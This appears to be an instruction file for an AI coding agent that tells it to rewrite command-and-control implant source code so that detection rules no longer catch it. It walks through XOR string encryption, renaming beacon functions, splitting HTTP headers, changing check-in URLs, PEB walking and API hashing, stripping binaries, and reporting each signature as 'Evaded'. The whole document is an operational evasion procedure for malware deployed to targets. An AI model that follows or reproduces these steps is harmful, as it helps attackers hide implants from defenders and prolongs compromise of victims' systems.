# Source Code Modification

Apply targeted modifications to C2 source code to evade detection.

## Core Principle

**Rule-Driven Modification**: Only modify patterns found in detection rules or proactive string analysis. Do NOT make random changes.

## Priority Framework

| Priority | Component | Why | Action |
|----------|-----------|-----|--------|
| 1 (HIGHEST) | Implant/Beacon/Agent | Deployed to targets | MODIFY |
| 2 (HIGH) | Network Exposure | Visible to scanners | MODIFY |
| 3 (SKIP) | Internal Strings | Not exposed | SKIP |

## Modification Types

### 1. String Obfuscation

**XOR Encryption:**

```c
// Before
char* header = "BeaconOutput";
char* url = "http://c2.example.com/api";

// After
char header[] = { 0x07, 0x02, 0x03, 0x08, 0x11, 0x08, 0x15, 0x17, 0x11, 0x05, 0x17, 0x16 }; // XOR 0x41
char url[] = { /* encrypted bytes */ };

void xor_decrypt(char* data, size_t len, char key) {
    for (size_t i = 0; i < len; i++) data[i] ^= key;
}
```

**Stack Strings:**

```c
// Before
char* str = "beacon";

// After
char str[] = {'b','e','a','c','o','n',0};
```

### 2. Function Renaming (Go)

Go binaries embed function names - must rename:

```go
// Before
func taskProcess(cmd string) { }
func jobRun(id int) { }
func execBof(data []byte) { }
func taskKill(pid int) { }

// After
func cmdProc(cmd string) { }
func jobExec(id int) { }
func runObj(data []byte) { }
func procTerm(pid int) { }
```

**Important:** Also rename all references and update imports.

### 3. HTTP Header Obfuscation

```go
// Before
const (
    HeaderBeaconID = "X-Beacon-Id"
    HeaderTaskID   = "X-Task-Id"
)

// After
var (
    HeaderBeaconID = strings.Join([]string{"X-", "Session", "-Id"}, "")
    HeaderTaskID   = strings.Join([]string{"X-", "Job", "-Id"}, "")
)
```

### 4. URL Pattern Changes

```go
// Before
const CheckinURL = "/api/checkin"
const TaskURL = "/api/task"

// After
const CheckinURL = "/api/sync"
const TaskURL = "/api/job"
```

### 5. API Obfuscation

**PEB Walking:**

```c
// Before
HMODULE hNtdll = LoadLibraryA("ntdll.dll");
FARPROC pNtAlloc = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

// After
HMODULE hNtdll = GetNtdllFromPEB();  // Custom PEB walk
FARPROC pNtAlloc = GetExportByHash(hNtdll, 0xE8C7A3D3);  // Hash-based
```

**API Hashing:**

```c
// Compute hash at compile time
#define HASH_API(str) ((str)[0] ^ ((str)[1] << 8) ^ ...)

DWORD hash_NtAllocVirtualMemory = HASH_API("NtAllocateVirtualMemory");
```

### 6. Config Key Renaming

```go
// Before
type Config struct {
    SleepInterval int `json:"sleep_interval"`
    Jitter        int `json:"jitter"`
    KillDate      string `json:"kill_date"`
}

// After
type Config struct {
    PollInterval int `json:"poll_interval"`
    Variance     int `json:"variance"`
    ExpiryDate   string `json:"expiry_date"`
}
```

### 7. Makefile Modifications

```makefile
# Before
CFLAGS = -O2 -g
LDFLAGS =

# After
CFLAGS = -O2 -fno-stack-protector -fno-asynchronous-unwind-tables \
         -fno-ident -ffunction-sections -fdata-sections
LDFLAGS = -Wl,--strip-all -Wl,--build-id=none -Wl,--gc-sections
```

## Modification Workflow

### Step 1: Map Patterns to Source

For each pattern found:

```bash
# String patterns
grep -rn "BeaconOutput" <path>

# Function names (Go)
grep -rn "func taskProcess" <path> --include="*.go"

# API names
grep -rn "LoadLibraryA\|GetProcAddress" <path>
```

### Step 2: Apply Modification

Use Edit tool to modify:

1. **Read** the file to understand context
2. **Edit** with precise old_string/new_string
3. **Verify** change applied correctly

### Step 3: Update References

```bash
# Find all references to old name
grep -rn "taskProcess" <path>

# Update each reference
```

### Step 4: Verify Removal

```bash
# Pattern should return nothing after modification
grep -rn "BeaconOutput" <path>  # Should return nothing
```

## What NOT to Modify

| Component | Why |
|-----------|-----|
| Server module names | Not in implant binary |
| Server console messages | Not exposed |
| Internal log formats | Not exposed |
| Version strings | Only in server console |
| README/docs | Not in binary |

## Output Format

```markdown
## Modifications Applied

| Pattern | File | Line | Modification | Status |
|---------|------|------|--------------|--------|
| "BeaconOutput" | http.go:78 | String | XOR encrypt | ✓ Evaded |
| TaskProcess | main.go:45 | Function | Rename to CmdProc | ✓ Evaded |
| "X-Beacon-Id" | config.go:12 | Header | Split string | ✓ Evaded |
| { 48 83 EC 58 } | Makefile | Stack | Reduce locals | ✓ Evaded |

## Files Modified

| File | Changes | Lines |
|------|---------|-------|
| main.go | Function renames | 12 |
| http.go | Header obfuscation | 5 |
| config.go | URL changes | 3 |
| Makefile | Compiler flags | 4 |

## Verification

| Pattern | Status |
|---------|--------|
| "BeaconOutput" | ✓ Not found |
| "TaskProcess" | ✓ Not found |
| "X-Beacon-Id" | ✓ Not found |
```

## Important Rules

1. ONLY modify code in user-provided path
2. ONLY modify patterns from detection rules or proactive analysis
3. ALWAYS verify modification success with grep
4. NEVER run or test modified binaries
5. Document ALL changes
